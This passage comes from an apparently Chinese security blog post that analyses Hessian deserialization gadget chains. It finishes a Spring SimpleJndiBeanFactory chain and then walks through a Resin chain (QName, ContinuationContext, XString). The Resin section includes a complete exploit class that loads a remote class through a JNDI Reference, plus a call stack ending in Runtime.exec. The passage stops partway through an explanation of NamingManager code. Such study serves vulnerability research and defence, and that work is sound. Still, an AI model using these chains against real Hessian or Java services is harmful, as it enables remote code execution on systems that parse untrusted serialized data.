<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Advice <span class="title function_">getAdvice</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Advice</span> <span class="variable">advice</span> <span class="operator">=</span> <span class="built_in">this</span>.advice;</span><br><span class="line">    <span class="comment">// 条件1，正常实例化对象就是null，不太需要关注</span></span><br><span class="line">    <span class="keyword">if</span> (advice != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> advice;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里需要关注</span></span><br><span class="line">    Assert.state(<span class="built_in">this</span>.adviceBeanName != <span class="literal">null</span>, <span class="string">&quot;&#x27;adviceBeanName&#x27; must be specified&quot;</span>);</span><br><span class="line">    Assert.state(<span class="built_in">this</span>.beanFactory != <span class="literal">null</span>, <span class="string">&quot;BeanFactory must be set to resolve &#x27;adviceBeanName&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 需要进入关键点，需要满足该条件</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.beanFactory.isSingleton(<span class="built_in">this</span>.adviceBeanName)) &#123;</span><br><span class="line">        <span class="comment">// Rely on singleton semantics provided by the factory.</span></span><br><span class="line">        <span class="comment">// 关键点</span></span><br><span class="line">        advice = <span class="built_in">this</span>.beanFactory.getBean(<span class="built_in">this</span>.adviceBeanName, Advice.class);</span><br><span class="line">        <span class="built_in">this</span>.advice = advice;</span><br><span class="line">        <span class="keyword">return</span> advice;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// No singleton guarantees from the factory -&gt; let&#x27;s lock locally but</span></span><br><span class="line">        <span class="comment">// reuse the factory&#x27;s singleton lock, just in case a lazy dependency</span></span><br><span class="line">        <span class="comment">// of our advice bean happens to trigger the singleton lock implicitly...</span></span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="built_in">this</span>.adviceMonitor) &#123;</span><br><span class="line">            advice = <span class="built_in">this</span>.advice;</span><br><span class="line">            <span class="keyword">if</span> (advice == <span class="literal">null</span>) &#123;</span><br><span class="line">                advice = <span class="built_in">this</span>.beanFactory.getBean(<span class="built_in">this</span>.adviceBeanName, Advice.class);</span><br><span class="line">                <span class="built_in">this</span>.advice = advice;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> advice;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里和PartiallyComparableAdvisorHolder链的后半部分类似，需要借助SimpleJndiBeanFactory对象，因此将beanFactory属性设置为SimpleJndiBeanFactory对象，根据后面SimpleJndiBeanFactory对象的getBean方法，要将adviceBeanName设置为JNDI url</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240203230001.png"></p>
<p><strong>注</strong>：</p>
<ul>
<li>这里的this.beanFactory.isSingleton(this.adviceBeanName)要返回true，根据分析，需要将SimpleJndiBeanFactory对象的shareableResources属性中塞入Ldap url，通过setShareableResources方法</li>
</ul>
<p><strong>第五步</strong></p>
<p>进入SimpleJndiBeanFactory对象的getBean方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; T <span class="title function_">getBean</span><span class="params">(String name, Class&lt;T&gt; requiredType)</span> <span class="keyword">throws</span> BeansException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 关键点</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.isSingleton(name) ? <span class="built_in">this</span>.doGetSingleton(name, requiredType) : <span class="built_in">this</span>.lookup(name, requiredType);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NameNotFoundException var4) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchBeanDefinitionException</span>(name, <span class="string">&quot;not found in JNDI environment&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (TypeMismatchNamingException var5) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanNotOfRequiredTypeException</span>(name, var5.getRequiredType(), var5.getActualType());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NamingException var6) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanDefinitionStoreException</span>(<span class="string">&quot;JNDI environment&quot;</span>, name, <span class="string">&quot;JNDI lookup failed&quot;</span>, var6);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的this.isSingleton(name)返回true或false都一样，因为后面两个最终都会到lookup处</p>
<p><strong>第六步</strong></p>
<p>后面部分跟PartiallyComparableAdvisorHolder链的后半部分一致</p>
<h3 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h3><ul>
<li><p>为什么要加入HotSwappableTargetSource对象的嵌套</p>
<p>最初的目的想直接将DefaultBeanFactoryPointcutAdvisor对象put进入HashMap，没有这么做的原因有两点：</p>
<ul>
<li><p>DefaultBeanFactoryPointcutAdvisor对象中的beanFactory与adviceBeanName属性在HashMap put之前设置，这样会导致在HashMap进行第二次put时出现异常，此时命令也执行成功，但是exp后面的序列化与反序列化部分未执行（这还有其他阻止异常的方式）</p>
</li>
<li><p>基于上述原因，考虑将DefaultBeanFactoryPointcutAdvisor对象中的beanFactory与adviceBeanName属性在HashMap进行put之后，序列化之前进行设置，这样在进行第二次put时，来到DefaultBeanFactoryPointcutAdvisor对象的getAdvice方法中会出现问题</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Assert.state(<span class="built_in">this</span>.adviceBeanName != <span class="literal">null</span>, <span class="string">&quot;&#x27;adviceBeanName&#x27; must be specified&quot;</span>);</span><br><span class="line">Assert.state(<span class="built_in">this</span>.beanFactory != <span class="literal">null</span>, <span class="string">&quot;BeanFactory must be set to resolve &#x27;adviceBeanName&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>而Assert.state定义如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">state</span><span class="params">(<span class="type">boolean</span> expression, String message)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!expression) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时this.adviceBeanName和this.beanFactory都为null，表达式为false，取反为true，故出现异常</p>
</li>
<li><p>综上考虑，加入一层HotSwappableTargetSource对象，将HotSwappableTargetSource对象的target在put操作之后进行设置</p>
</li>
</ul>
</li>
<li><p>避免出现异常，exp执行终止而导致为序列化的方法</p>
</li>
<li><p>在AbstractPointcutAdvisor类中的equals方法，存在两个getAdvice，其实在hashMap中，两个key调换顺序都会触发执行，只不过调用栈会有所不同</p>
</li>
</ul>
<h2 id="Resin链"><a href="#Resin链" class="headerlink" title="Resin链"></a>Resin链</h2><p>依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.caucho<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>resin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.63<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="利用链-4"><a href="#利用链-4" class="headerlink" title="利用链"></a>利用链</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">NamingManager.getObjectFactoryFromReference() (javax.naming.spi)</span><br><span class="line">NamingManager.getObjectInstance() (javax.naming.spi)</span><br><span class="line">NamingManager.getContext() (javax.naming.spi)</span><br><span class="line">ContinuationContext.getTargetContext() (javax.naming.spi)</span><br><span class="line">ContinuationContext.composeName() (javax.naming.spi)   <span class="comment">// 关键点</span></span><br><span class="line">QName.toString() (com.caucho.naming)     <span class="comment">// 关键点</span></span><br><span class="line">XString.equals() (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">HashMap.putVal()</span><br><span class="line">HashMap.put()</span><br><span class="line">MapDeserializer.readMap()</span><br><span class="line">SerializerFactory.readMap()</span><br><span class="line">Hessian2Input.readObject()</span><br></pre></td></tr></table></figure>

<h3 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.dili.hessian;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.SerializerFactory;</span><br><span class="line"><span class="keyword">import</span> com.caucho.naming.QName;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> javax.naming.CannotProceedException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ResinHessian</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">refAddr</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8888/&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">refClassName</span> <span class="operator">=</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(refClassName, refClassName, refAddr);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">cannotProceedException</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.naming.CannotProceedException&quot;</span>).getDeclaredConstructor().newInstance();</span><br><span class="line">        <span class="type">String</span> <span class="variable">classname</span> <span class="operator">=</span> <span class="string">&quot;javax.naming.NamingException&quot;</span>;</span><br><span class="line">        setFiled(classname, cannotProceedException, <span class="string">&quot;resolvedObj&quot;</span>, ref);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建ContinuationContext对象</span></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;javax.naming.spi.ContinuationContext&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);</span><br><span class="line">        <span class="comment">// 构造方法为protected修饰</span></span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Context</span> <span class="variable">continuationContext</span> <span class="operator">=</span> (Context) constructor.newInstance(cannotProceedException, <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建QName</span></span><br><span class="line">        <span class="type">QName</span> <span class="variable">qName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">QName</span>(continuationContext, <span class="string">&quot;aaa&quot;</span>, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> unhash(qName.hashCode());</span><br><span class="line">        <span class="comment">// 创建Xtring</span></span><br><span class="line">        <span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(str);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建HashMap</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(qName, <span class="string">&quot;111&quot;</span>);</span><br><span class="line">        hashMap.put(xString, <span class="string">&quot;222&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;JavaSec/out/ResinHessian.bin&quot;</span>);</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(fileOutputStream);</span><br><span class="line">        <span class="type">SerializerFactory</span> <span class="variable">serializerFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SerializerFactory</span>();</span><br><span class="line">        serializerFactory.setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        hessian2Output.setSerializerFactory(serializerFactory);</span><br><span class="line">        hessian2Output.writeObject(hashMap);</span><br><span class="line">        hessian2Output.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;JavaSec/out/ResinHessian.bin&quot;</span>);</span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(fileInputStream);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">o</span> <span class="operator">=</span> (HashMap) hessian2Input.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFiled</span><span class="params">(String classname, Object o, String fieldname, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(classname);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> aClass.getDeclaredField(fieldname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(o, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">unhash</span> <span class="params">( <span class="type">int</span> hash )</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">target</span> <span class="operator">=</span> hash;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">answer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">if</span> ( target &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            <span class="comment">// String with hash of Integer.MIN_VALUE, 0x80000000</span></span><br><span class="line">            answer.append(<span class="string">&quot;\\u0915\\u0009\\u001e\\u000c\\u0002&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( target == Integer.MIN_VALUE )</span><br><span class="line">                <span class="keyword">return</span> answer.toString();</span><br><span class="line">            <span class="comment">// Find target without sign bit set</span></span><br><span class="line">            target = target &amp; Integer.MAX_VALUE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        unhash0(answer, target);</span><br><span class="line">        <span class="keyword">return</span> answer.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unhash0</span> <span class="params">( StringBuilder partial, <span class="type">int</span> target )</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">div</span> <span class="operator">=</span> target / <span class="number">31</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">rem</span> <span class="operator">=</span> target % <span class="number">31</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( div &lt;= Character.MAX_VALUE ) &#123;</span><br><span class="line">            <span class="keyword">if</span> ( div != <span class="number">0</span> )</span><br><span class="line">                partial.append((<span class="type">char</span>) div);</span><br><span class="line">            partial.append((<span class="type">char</span>) rem);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            unhash0(partial, div);</span><br><span class="line">            partial.append((<span class="type">char</span>) rem);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="函数调用栈-3"><a href="#函数调用栈-3" class="headerlink" title="函数调用栈"></a>函数调用栈</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">exec:<span class="number">347</span>, Runtime (java.lang)</span><br><span class="line">&lt;init&gt;:<span class="number">6</span>, test</span><br><span class="line">newInstance0:-<span class="number">1</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">62</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">45</span>, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">422</span>, Constructor (java.lang.reflect)</span><br><span class="line">newInstance:<span class="number">442</span>, Class (java.lang)</span><br><span class="line">getObjectFactoryFromReference:<span class="number">163</span>, NamingManager (javax.naming.spi)</span><br><span class="line">getObjectInstance:<span class="number">319</span>, NamingManager (javax.naming.spi)</span><br><span class="line">getContext:<span class="number">439</span>, NamingManager (javax.naming.spi)</span><br><span class="line">getTargetContext:<span class="number">55</span>, ContinuationContext (javax.naming.spi)</span><br><span class="line">composeName:<span class="number">180</span>, ContinuationContext (javax.naming.spi)</span><br><span class="line">toString:<span class="number">353</span>, QName (com.caucho.naming)</span><br><span class="line">equals:<span class="number">392</span>, XString (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">putVal:<span class="number">634</span>, HashMap (java.util)</span><br><span class="line">put:<span class="number">611</span>, HashMap (java.util)</span><br><span class="line">readMap:<span class="number">114</span>, MapDeserializer (com.caucho.hessian.io)</span><br><span class="line">readMap:<span class="number">538</span>, SerializerFactory (com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">2110</span>, Hessian2Input (com.caucho.hessian.io)</span><br><span class="line">main:<span class="number">62</span>, ResinHessian (org.dili.hessian)</span><br></pre></td></tr></table></figure>

<h3 id="详细分析-3"><a href="#详细分析-3" class="headerlink" title="详细分析"></a>详细分析</h3><p><strong>第一步</strong></p>
<p>还是同样的流程，Hessian2Input.readObject方法到MapDeserializer.readMap方法，来到关键的循环处，读取hashMap，依然是读取一轮后，在第二轮读取中触发</p>
<p><strong>第二步</strong></p>
<p>这条链依旧借助XString中的equals方法，所以在exp中第二次put进去的是XString对象，但是根据HashMap中putVal方法的了解，要想到达equals方法的调用处，需要满足前面的几个if条件：</p>
<ul>
<li>(p &#x3D; tab[i &#x3D; (n - 1) &amp; hash]) &#x3D;&#x3D; null</li>
<li>p.hash &#x3D;&#x3D; hash</li>
</ul>
<p>其实这两个条件表达的意思一致，就是put进去的两个元素的hashcode要一致，这样才有资格到达equals方法处，第一个元素QName对象是需要利用的对象，固定不动，而XString是为了触发equals方法而构造的对象，对链的后半部分无影响，因此可以根据QName的hash来构造XString对象</p>
<ul>
<li><p>目标hash：QName中有hashCode方法，直接调用即可得到目标hash</p>
</li>
<li><p>如何构造能够影响XString的hash</p>
<p>查看其hashCode方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> str().hashCode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看str方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">str</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="literal">null</span> != m_obj) ? ((String) m_obj) : <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>即将m_obj属性转换成字符串类型返回，最后调用String的hashCode方法进行hash计算，这里的m_obj即是实例化XString传入的参数</p>
<p>现在的关键点在于根据String类的hashCode逻辑，得到该方法的逆操作，即根据hash值得到对应的string，然后将其作为m_obj</p>
<p>详细的逆操作算法参考网上，详细查看exp中unhash</p>
</li>
</ul>
<p>最终通过构造的XString即可绕过两个条件，调用XString的equals方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240204211351.png"></p>
<p><strong>第三步</strong></p>
<p>在XString的equals方法中会调用传入参数的toString方法，即QName对象的toString方法</p>
<p><strong>第四步</strong></p>
<p>进入QName的toString方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size(); i++) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> (String) get(i);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (name != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 关键点</span></span><br><span class="line">                name = _context.composeName(str, name);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">                name = name + <span class="string">&quot;/&quot;</span> + str;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            name = str;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里利用的是composeName方法，需要将_context属性设置为ContinuationContext对象，就能够调用其composeName方法进行下一步操作</p>
<p>那么需要到达关键点处，就需要满足相关条件，即name !&#x3D; null，在方法开始处name被赋值为null，只能看for循环中的操作，这里需要循环两次，第一次通过else为name赋值，第二次进入关键点，那么需要观察size方法和get方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> _items.size();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">get</span><span class="params">(<span class="type">int</span> pos)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (pos &lt; _items.size())</span><br><span class="line">        <span class="keyword">return</span> (String) _items.get(pos);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的items是一个数组</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> ArrayList&lt;String&gt; _items = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br></pre></td></tr></table></figure>

<p>因此只需要在构造QName时为_items赋值即可，有多种方法</p>
<ul>
<li><p>构造方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">QName</span><span class="params">(Context context, String first, String rest)</span></span><br><span class="line">&#123;</span><br><span class="line">    _context = context;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (first != <span class="literal">null</span>)</span><br><span class="line">        _items.add(first);</span><br><span class="line">    <span class="keyword">if</span> (rest != <span class="literal">null</span>)</span><br><span class="line">        _items.add(rest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>通过成员方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Name <span class="title function_">add</span><span class="params">(<span class="type">int</span> posn, String comp)</span></span><br><span class="line">    <span class="keyword">throws</span> InvalidNameException</span><br><span class="line">&#123;</span><br><span class="line">    _items.add(posn, comp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240204223035.png"></p>
<p><strong>第五步</strong></p>
<p>进入ContinuationContext类的composeName方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">composeName</span><span class="params">(String name, String prefix)</span></span><br><span class="line">    <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="comment">// 关键点</span></span><br><span class="line">    <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> getTargetContext();</span><br><span class="line">    <span class="keyword">return</span> ctx.composeName(name, prefix);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入getTargetContext方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Context <span class="title function_">getTargetContext</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="keyword">if</span> (contCtx == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cpe.getResolvedObj() == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)cpe.fillInStackTrace();</span><br><span class="line">		</span><br><span class="line">        <span class="comment">// 关键点</span></span><br><span class="line">        contCtx = NamingManager.getContext(cpe.getResolvedObj(),</span><br><span class="line">                                           cpe.getAltName(),</span><br><span class="line">                                           cpe.getAltNameCtx(),</span><br><span class="line">                                           env);</span><br><span class="line">        <span class="keyword">if</span> (contCtx == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)cpe.fillInStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> contCtx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先观察关键点中所需要的参数，cpe和env，而到达关键点，需要满足if中的条件</p>
<ul>
<li>contCtx &#x3D;&#x3D; null，在构造中本身就不设置，所以不需要考虑</li>
<li>cpe.getResolvedObj()返回不为null，同时在关键点参数中也会用到，因此这里需要构造，不会为null</li>
</ul>
<p>观察ContinuationContext的构造方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">ContinuationContext</span><span class="params">(CannotProceedException cpe,</span></span><br><span class="line"><span class="params">                              Hashtable&lt;?,?&gt; env)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.cpe = cpe;</span><br><span class="line">    <span class="built_in">this</span>.env = env;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>两个点：</p>
<ul>
<li>cpe为CannotProceedException对象，因此需要构造该类对象，因此getResolvedObj()等方法需要在构造CannotProceedException时设置</li>
<li>该构造方法为protected修饰，因此通过反射得到对应的构造方法后，需要通过setAccess进行设置</li>
</ul>
<p><strong>第六步</strong></p>
<p>进入NamingManager的getContext，看看需要传入什么参数</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240204224408.png"></p>
<p>得到一个条件，传入的参数不能为Context实例</p>
<p>还是这些参数，继续进入getObjectInstance方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object</span><br><span class="line">    <span class="title function_">getObjectInstance</span><span class="params">(Object refInfo, Name name, Context nameCtx,</span></span><br><span class="line"><span class="params">                      Hashtable&lt;?,?&gt; environment)</span></span><br><span class="line">    <span class="keyword">throws</span> Exception</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    ObjectFactory factory;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Use builder if installed</span></span><br><span class="line">    <span class="type">ObjectFactoryBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> getObjectFactoryBuilder();</span><br><span class="line">    <span class="keyword">if</span> (builder != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// builder must return non-null factory</span></span><br><span class="line">        factory = builder.createObjectFactory(refInfo, environment);</span><br><span class="line">        <span class="keyword">return</span> factory.getObjectInstance(refInfo, name, nameCtx,</span><br><span class="line">                                         environment);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Use reference if possible</span></span><br><span class="line">    <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">        ref = (Reference) refInfo;</span><br><span class="line">    &#125; <span class="keyword">else</span> 